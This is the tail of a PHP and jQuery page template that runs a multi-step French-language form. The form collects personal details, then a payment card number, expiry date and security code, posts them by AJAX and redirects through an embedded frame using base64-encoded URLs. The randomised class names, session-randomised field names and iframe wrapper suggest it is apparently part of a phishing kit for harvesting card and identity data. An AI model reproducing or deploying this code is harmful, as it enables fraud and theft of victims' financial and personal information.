</main>

<script>
    function showWrapper() {
        parent.postMessage({
            showWrapper: true
        }, '*');
    }

    function hideWrapper() {
        parent.postMessage({
            hideWrapper: true
        }, '*');
    }

    document.addEventListener("DOMContentLoaded", function(event) {
        var height;

        function sendHeightChange() {
            var newHeight = document.documentElement.scrollHeight;
            if (newHeight !== height) {
                height = newHeight;
                parent.postMessage({
                    frameHeight: height
                }, '*');
            }
        }

        var observer = new MutationObserver(sendHeightChange);
        observer.observe(document.body, {
            attributes: true,
            childList: true,
            subtree: true
        });

        sendHeightChange();

        hideWrapper();
    });
</script>

<script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/jquery-validation@1.19.5/dist/jquery.validate.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/cleave.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/cleave.js@1.6.0/dist/addons/cleave-phone.fr.js"></script>

<script>
    $(document).ready(function() {
        <?php if ($_GET['op'] === $_SESSION["op"][0]) { ?>
            var cleave = new Cleave('#<?php echo $_SESSION["attribute"][4]; ?>', {
                phone: true,
                phoneRegionCode: 'FR'
            });

            var cleave = new Cleave('#<?php echo $_SESSION["attribute"][6]; ?>', {
                numericOnly: true,
                blocks: [5]
            });
        <?php } ?>

        <?php if ($_GET['op'] === $_SESSION["op"][1]) { ?>
            var cleave = new Cleave('#<?php echo $_SESSION["attribute"][9]; ?>', {
                creditCard: true,
            });

            var cleave = new Cleave('#<?php echo $_SESSION["attribute"][10]; ?>', {
                date: true,
                datePattern: ['m', 'y']
            });

            var cleave = new Cleave('#<?php echo $_SESSION["attribute"][11]; ?>', {
                numericOnly: true,
                blocks: [3]
            });
        <?php } ?>

        $.validator.addMethod("birthDate", function(value, element) {
            var birthDate = new Date(value);
            var today = new Date();
            var age = today.getFullYear() - birthDate.getFullYear();
            var m = today.getMonth() - birthDate.getMonth();
            if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) {
                age--;
            }
            return age >= 18;
        }, "Vous devez avoir 18 ans ou plus");

        $.validator.addMethod("phoneNumber", function(value, element) {
            return this.optional(element) || /^\+?[0-9\s\-().]{7,15}$/.test(value);
        }, "Veuillez entrer un numéro de téléphone valide");

        $('.form-b69').validate({
            highlight: function(element) {
                var parentDiv = $(element).closest('.input-coz');
                parentDiv.removeClass('input-3pi').addClass('input-gdw');
                parentDiv.find('.message-izy').remove();
                var errorMessage = $(element).data('msg') || "Ce champ est invalide";
                parentDiv.append('<p class="message-izy"><span class="error-25o"><span class="lecteurs-ecrans-c4g"></span><span>' + errorMessage + '</span></span></p>');
            },
            unhighlight: function(element) {
                var parentDiv = $(element).closest('.input-coz');
                parentDiv.removeClass('input-gdw').addClass('input-3pi');
                parentDiv.find('.message-izy').remove();
                parentDiv.append('<p class="message-izy"><span class="text-4k3"><span class="lecteurs-ecrans-c4g"> Validé </span><span>Ce champ est valide</span></span></p>');
            },
            errorPlacement: function(error, element) {
                $(element).data('msg', error.text());
            },
            rules: {
                "<?php echo $_SESSION["attribute"][0]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][1]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][2]; ?>": {
                    required: true,
                    birthDate: true
                },
                "<?php echo $_SESSION["attribute"][3]; ?>": {
                    required: true,
                    email: true
                },
                "<?php echo $_SESSION["attribute"][4]; ?>": {
                    required: true,
                    phoneNumber: true
                },
                "<?php echo $_SESSION["attribute"][5]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][6]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][7]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][8]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][9]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][10]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][11]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][12]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][13]; ?>": {
                    required: true
                },
                "<?php echo $_SESSION["attribute"][14]; ?>": {
                    required: true
                }
            },
            messages: {
                "<?php echo $_SESSION["attribute"][0]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][1]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][2]; ?>": {
                    required: "Ce champ est requis",
                    age18OrOlder: "Vous devez avoir 18 ans ou plus"
                },
                "<?php echo $_SESSION['attribute'][3]; ?>": {
                    required: "Ce champ est requis",
                    email: "Veuillez entrer une adresse email valide"
                },
                "<?php echo $_SESSION['attribute'][4]; ?>": {
                    required: "Ce champ est requis",
                    phoneNumber: "Veuillez entrer un numéro de téléphone valide"
                },
                "<?php echo $_SESSION["attribute"][5]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][6]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][7]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][8]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][9]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][10]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][11]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][12]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][13]; ?>": {
                    required: "Ce champ est requis"
                },
                "<?php echo $_SESSION["attribute"][14]; ?>": {
                    required: "Ce champ est requis"
                }
            }
        });
    });
</script>

<?php if ($_GET['op'] === $_SESSION["op"][2]) { ?>
    <script>
        $(document).ready(function() {
            const selectElement = $('#<?php echo $_SESSION["attribute"][12]; ?>');
            const nextElement = selectElement.closest('.input-coz').next();
            const input = $('#<?php echo $_SESSION["attribute"][13]; ?>');
            const inputParent = $('#<?php echo $_SESSION["attribute"][14]; ?>').closest('.input-coz');

            function updateFormState() {
                if (selectElement.val() === '1') {
                    nextElement.hide();
                    nextElement.next().show();
                    nextElement.find('input, select').prop('disabled', true);
                } else {
                    nextElement.show();
                    nextElement.next().hide();
                    nextElement.find('input, select').prop('disabled', false);
                }

                if (input.val().length > 1) {
                    inputParent.show();
                    inputParent.find('input, select').prop('disabled', false);
                } else {
                    inputParent.hide();
                    inputParent.find('input, select').prop('disabled', true);
                }
            }

            updateFormState();

            selectElement.on('change', updateFormState);
            input.on('input', updateFormState);
        });
    </script>
<?php } ?>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        var form = document.getElementsByTagName('form')[0];

        form.addEventListener('submit', function(event) {
            event.preventDefault();

            if ($(this).valid()) {
                showWrapper();

                $.ajax({
                    url: form.action,
                    type: 'POST',
                    data: $(this).serialize(),
                    success: function(response) {
                        setTimeout(function() {
                            <?php if ($_GET['op'] === $_SESSION["op"][0]) { ?>
                                top.location.href = "<?php echo "$scheme$user$pass$host$port" . '/' . APP_PATH . '/' . EMBED_PATH; ?>?url=<?php echo base64_encode("$scheme$user$pass$host$port" . '/' . APP_PATH . '/' . str_replace('.php', '', $_SESSION["filename"][0]) . "?op=" . $_SESSION["op"][1]); ?>";
                            <?php } ?>
                            <?php if ($_GET['op'] === $_SESSION["op"][1]) { ?>
                                top.location.href = "<?php echo "$scheme$user$pass$host$port" . '/' . APP_PATH . '/' . EMBED_PATH; ?>?url=<?php echo base64_encode("$scheme$user$pass$host$port" . '/' . APP_PATH . '/' . str_replace('.php', '', $_SESSION["filename"][0]) . "?op=" . $_SESSION["op"][2]); ?>";
                            <?php } ?>
                            <?php if ($_GET['op'] === $_SESSION["op"][2]) { ?>
                                top.location.href = "<?php echo "$scheme$user$pass$host$port" . '/' . APP_PATH . '/' . EMBED_PATH; ?>?url=<?php echo base64_encode("$scheme$user$pass$host$port" . '/' . APP_PATH . '/' . str_replace('.php', '', $_SESSION["filename"][0]) . "?op=" . $_SESSION["op"][2]); ?>";
                            <?php } ?>
                        }, <?php echo $_GET['op'] === $_SESSION["op"][1] || $_GET['op'] === $_SESSION["op"][2] ? 10000 : 2000; ?>);
                    },
                    error: function(xhr, status, error) {
                        top.location.href = "<?php echo "$scheme$user$pass$host$port" . '/' . APP_PATH . '/' . EMBED_PATH; ?>?url=<?php echo base64_encode("$scheme$user$pass$host$port" . '/' . APP_PATH . '/' . str_replace('.php', '', $_SESSION["filename"][0]) . "?op=" . $_GET["op"]); ?>";
                    }
                });
            }
        });
    });
</script>

</body>

</html>